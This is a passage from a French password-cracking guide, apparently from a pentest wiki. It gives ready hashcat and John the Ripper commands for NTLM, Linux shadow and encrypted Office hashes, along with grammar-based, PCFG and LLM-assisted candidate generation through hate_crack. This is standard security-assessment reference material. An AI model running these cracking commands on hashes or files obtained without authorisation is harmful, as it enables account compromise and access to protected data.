- [**kwprocessor**](https://github.com/hashcat/kwprocessor)** :** Générateur avancé de parcours clavier avec caractères de base, disposition du clavier et itinéraires configurables.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John mutation

Lisez _**/etc/john/john.conf**_ et configurez-le.

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Attaques Hashcat

- **Wordlist attack** (`-a 0`) avec des règles

**Hashcat** est déjà fourni avec un **dossier contenant des règles**, mais vous pouvez trouver [**d’autres règles intéressantes ici**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### Expliquer et profiler les fichiers de règles

Les règles Hashcat exécutent les opcodes de gauche à droite. Cela peut être facile à mal interpréter lorsque les opérations s’appliquent à la position zéro : `^e ^h ^t` ajoute `e`, puis `h`, puis `t` au début, et transforme donc `password` en `thepassword`. Les substitutions comparent les octets en tenant compte de la casse ; une règle telle que `sa@` ne fait donc rien si le `A` est en majuscule. Testez les règles que vous ne connaissez pas sur des mots de base représentatifs en minuscules, en majuscules et avec une casse mixte avant d’y consacrer du temps GPU.<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) peut afficher chaque candidat intermédiaire et résumer la répartition des opcodes dans un fichier de règles complet. Le décompte statique des opcodes révèle si un fichier ajoute ou préfixe principalement des caractères, les substitue ou les tronque. Il ne prouve pas qu’une règle permettra de casser un mot de passe, mais aide à choisir un jeu de règles correspondant aux motifs de mots de passe observés dans la population cible.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Réduire les règles redondantes avec les journaux de debug

Le mode debug de Hashcat enregistre les transformations des règles séparément de la sortie normale d’état et de résultats. Le mode `4` écrit `baseword:rule:candidate` ; le mode `5` ajoute la wordlist source. Définissez toujours explicitement `--debug-file`. Sinon, Hashcat ouvre `hashcat.debugfile` dans son répertoire de profil, et la redirection de stdout capture le flux de la console plutôt que ces enregistrements. Les fichiers de debug sont ouverts en mode ajout : supprimez ou faites pivoter un ancien fichier avant une nouvelle mesure, et protégez-le car il contient les basewords et les candidats en clair.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

Utilisez `frequency` pour trouver les règles appliquées le plus souvent, `basewords` pour mesurer la couverture des entrées distinctes et `candidates` pour compter les sorties distinctes. Le classement des candidats est généralement le meilleur point de départ pour réduire le nombre de règles, car une règle fréquemment appliquée peut tout de même transformer de nombreuses entrées en candidats identiques. Copiez les règles les plus intéressantes dans un fichier plus petit, relancez-le sur les hash restants et comparez les rapports entre les exécutions. Le mode `5` indique également si chaque wordlist source fournit des basewords utiles ; forcez l’analyse avec `--debug-mode 4` ou `--debug-mode 5` lorsque des deux-points dans les données rendent la détection automatique ambiguë.<sup>[[6]](#references)[[9]](#references)</sup>

- Attaque **Wordlist combinator**

Il est possible de **combiner 2 wordlists en une seule** avec hashcat.\
Si la première liste contenait le mot **« hello »** et la seconde deux lignes contenant les mots **« world »** et **« earth »**, les mots `helloworld` et `helloearth` seraient générés.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Attaques par combinateur guidées par une grammaire (exemple avec Office chiffré)

Un mot de passe peut être long et contenir plusieurs catégories de caractères tout en ayant un **espace de recherche effectif** réduit s’il suit une grammaire connue. Pour un document Office chiffré obtenu dans le cadre d’une évaluation autorisée, `office2john.py` extrait l’enregistrement de vérification du mot de passe ; cela permet de tester des mots de passe localement, sans verrouillage de compte, limitation de débit ni MFA en ligne. Cela ne contourne pas le chiffrement du document.<sup>[[2]](#references)[[5]](#references)</sup>

Supprimez le champ du nom de fichier ajouté par John afin que Hashcat ne reçoive que le vérificateur :<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

Sélectionnez `-m` à partir du préfixe extrait plutôt que de l’extension du fichier. Hashcat associe `$office$*2007*`, `$office$*2010*` et `$office$*2013*` aux modes `9400`, `9500` et `9600` ; les enregistrements legacy `$oldoffice$0/$1` et `$oldoffice$3/$4` utilisent respectivement les modes `9700` et `9800`.<sup>[[3]](#references)</sup>

Si des renseignements sur la réutilisation des mots de passe, les règles, les indices ou des personnes connaissant l’utilisateur révèlent une structure telle que `<word><number><optional !><word>`, matérialisez le préfixe énumérable indépendamment sous forme de dictionnaire de gauche. Cet exemple teste les nombres de `0` à `99` ; adaptez la plage et les transformations aux éléments recueillis lors de l’évaluation.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Le mode d’attaque `1` de Hashcat ajoute chaque ligne du dictionnaire de droite à chaque ligne du dictionnaire de gauche. Ainsi, les fichiers contenant respectivement `L` et `R` lignes produisent `L × R` candidats avant l’application de toute règle. La commande suivante est spécifiquement destinée à un enregistrement `$oldoffice$3/$4` ancien ; changez le mode pour les autres formats Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

Ce modèle de prétraitement s’applique à d’autres formats vérifiables hors ligne : énumérez uniquement les majuscules plausibles, les dates, les séparateurs, les chiffres ou la ponctuation d’un composant, puis combinez-le avec le composant restant au lieu de brute-forcer la longueur totale nominale.<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### Valider les fichiers `.hcmask` avant le lancement

Une ligne mal formée peut passer inaperçue parmi des masques valides. Validez donc le fichier complet et l’espace de clés estimé avant de lancer l’attaque. HashcatRosetta indique la ligne fautive et renvoie un code de sortie non nul si un masque est invalide, ce qui rend cette vérification adaptée aux scripts ou à la CI.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

Ne normalisez pas les fichiers de mask avec des parseurs CSV ou texte génériques. Hashcat prend en charge les charsets personnalisés `?1` à `?8`, traite `#` comme un commentaire uniquement lorsqu’il s’agit du premier octet, et supprime les séquences d’échappement avec une barre oblique inverse en un seul passage avant d’interpréter les tokens `?`. Ainsi, les espaces en tête avant `#` font partie du mask, et l’échappement peut déterminer si une séquence est un caractère littéral ou un token de charset.<sup>[[6]](#references)[[9]](#references)</sup>

- Attaque Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Passes Hashcat entraînées sur la cible avec hate_crack

[hate_crack](https://github.com/trustedsec/hate_crack) orchestre des passes Hashcat locales une fois que vous disposez d’un fichier de hashes et que vous connaissez le mode Hashcat correspondant. Hashcat doit être installé séparément. Clonez le dépôt avec ses sous-modules, exécutez `make`, puis lancez une session interactive ; le mode `1000` de l’exemple correspond à NTLM et n’est pas une valeur par défaut universelle. Pour les clones existants, exécutez `git submodule update --init --recursive` avant d’utiliser les options PCFG et PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**Apprenez une grammaire à partir de textes en clair récupérés.** Effectuez d’abord un passage avec un dictionnaire et des règles, puis entraînez `pcfg_cracker` sur des textes en clair pertinents pour la cible. Définissez `pcfgRuleset` dans `config.json` sur le ruleset entraîné et choisissez PCFG (menu `20`) pour transmettre à Hashcat les structures les plus probables, ou PRINCE-LING (`21`) pour créer une liste de base PRINCE guidée par une grammaire. Limitez les deux générateurs avec `pcfgMaxCandidates` et `pcfgPrinceLingMaxCandidates` ; hate_crack n’entraîne pas la grammaire à votre place. PCFG apprend la probabilité de structures telles qu’un mot de base suivi de chiffres et de symboles, contrairement à la grammaire fixe de [l’exemple combinator](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**Remontez les règles à partir de mots de passe connus.** Spoonman (menu `22`) prend un corpus en clair, y compris le fichier `.out` non vide de la session en cours, et en déduit des basewords en minuscules ainsi que des règles Hashcat permettant de reconstruire les mots de passe observés. Il classe les règles selon le nombre de mots de passe du corpus qu’elles reproduisent. Commencez par le palier couvrant les 50 % les mieux classés et élargissez uniquement si l’espace de recherche supplémentaire se justifie ; combinez les basewords dérivés avec d’autres wordlists pertinentes lorsque c’est le stem manquant, plutôt que la mutation, qui limite la couverture. Hashcat accepte au maximum 31 fonctions par règle et son alphabet de positions ne désigne que les indices `0` à `35` ; lorsque Spoonman ne peut pas encoder un mot de passe, il utilise un baseword littéral et une règle sans effet. Les très grands corpus peuvent atteindre la limite du compteur à mémoire bornée ; consultez donc la couverture indiquée au lieu de supposer une reconstruction complète. Consultez [le fonctionnement des règles Hashcat](#explain-and-profile-rule-files) avant de réutiliser les résultats de manière indépendante.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**Choisissez un générateur en fonction des éléments disponibles.** OMEN (`13`) entraîne un modèle de transition de caractères à partir d’une liste de mots de passe et énumère les candidats par ordre de probabilité, dans la limite de `omenMaxCandidates`. Markov brute force (`15`) peut plutôt créer une table `.hcstat2` à partir des cracks du fichier `.out` actuel ou d’une liste sélectionnée, puis tester une plage de longueurs incrémentale. Lorsque les informations sur la cible sont sous forme de texte plutôt que de mots de passe, N-gram (`16`) transmet un corpus, y compris un fichier gzip, à `ngramX.bin` ; la taille de groupe par défaut est de trois. Ce sont des solutions de remplacement, pas trois copies de la même liste de candidats.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**N’élargissez que les petits pools plausibles.** Permutation (`17`) réordonne chaque caractère de chaque mot d’entrée : un seul mot de huit caractères produit donc `8!` permutations. Combipow (`19`) génère les combinaisons de sous-ensembles non vides d’un pool de mots court servant de passphrase ; `-s` insère des espaces et l’outil refuse plus de 63 lignes d’entrée. Combinator (`6`) peut joindre plusieurs wordlists avec des séparateurs via `--sepFill` ; la concaténation ordinaire de deux listes est couverte par le [combinator natif de Hashcat](#hashcat-attacks) ci-dessus.<sup>[[13]](#references)[[14]](#references)</sup>

**Maîtrisez le budget des attaques par rétroaction.** Fingerprint (`5`) développe de manière itérative les mots de passe nouvellement crackés en augmentant la longueur des fragments, au lieu de redévelopper tout le corpus à chaque tour ; le seuil d’espace de recherche des combinaisons permet d’ignorer un passage `-a 1` trop volumineux. Hybrid (`7`) essaie d’abord des décorations `?s?d` moins coûteuses, puis des masques plus larges `?a` en préfixe/suffixe, avec `hcatHybridMaxRuntime` pour limiter la durée d’exécution. C’est important, car le coût d’un passage hybride correspond à la taille de la wordlist multipliée par l’espace du masque : un masque large appliqué à une grande liste peut largement dépasser le coût des premiers passages.<sup>[[13]](#references)[[14]](#references)</sup>

**Générez des candidats à partir des mots de passe récupérés à l’aide d’un LLM local.** Après qu’un premier passage a produit un fichier `<hashfile>.out` non vide, l’attaque LLM de hate_crack (menu principal `12`, sous-menu **Cracked passwords** `3`) peut déduire les basewords, les années, les suffixes et la casse propres à la cible, puis soumettre de nouveaux candidats à Hashcat. Les petits corpus peuvent inclure les textes en clair récupérés dans l’invite du modèle ; les corpus plus volumineux sont plutôt résumés sous forme de statistiques. Cette méthode généralise les conventions observées, au lieu de simplement rejouer les [règles](#explain-and-profile-rule-files) ou les [masques](#hashcat-attacks) prédéfinis ci-dessus.<sup>[[13]](#references)[[14]](#references)</sup>

Configurez dans le fichier `.env` de hate_crack un modèle Ollama local déjà servi ; le modèle n’est pas téléchargé automatiquement. `OLLAMA_NO_CLOUD=true` rejette les modèles portant une étiquette cloud et les adresses de endpoints externes. Un endpoint localhost ne suffit pas : Ollama peut utiliser un proxy pour accéder à distance à un modèle `-cloud`, et les invites peuvent contenir des textes en clair récupérés ou des statistiques du corpus. Ce paramètre autorise toujours les endpoints sur réseau privé et ne permet pas d’exclure un proxy de transport ; vérifiez donc le chemin d’inférence avant d’envoyer des données client.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

Comparez le rendement des candidats avec des passes moins coûteuses utilisant des règles, des masques et un entraînement sur la cible avant d’allouer un budget plus important. Le modèle génère des candidats ; Hashcat les teste toujours contre les hashes.<sup>[[13]](#references)[[14]](#references)</sup>

#### Modes Hashcat

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Cracking des hashes Linux - fichier /etc/shadow

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Cracking des hashes Windows

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Cracking des hashes d'applications courantes

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [À l’intérieur de GoBruteforcer : configurations par défaut de serveur générées par l’IA, mots de passe faibles et campagnes axées sur les cryptomonnaies](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper : `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Exemples de hash et modes Microsoft Office de Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Attaque combinator de Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [Planification successorale des identifiants](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [Dépôt HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
- [7] [Implémentation du fichier de débogage de Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Aide en ligne de commande de Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta : déchiffrer la pierre de Rosette du cassage de mots de passe](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [Dépôt et utilisation de PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
- [11] [Dépôt et guide utilisateur d’OMEN](https://github.com/RUB-SysSec/OMEN)
- [12] [Problème d’origine de Spoonman et conception de la dérivation des règles](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [Dépôt hate_crack et documentation des attaques](https://github.com/trustedsec/hate_crack)
- [14] [Nouveautés de hate_crack depuis la version 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [Politique de destination LLM de hate_crack](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
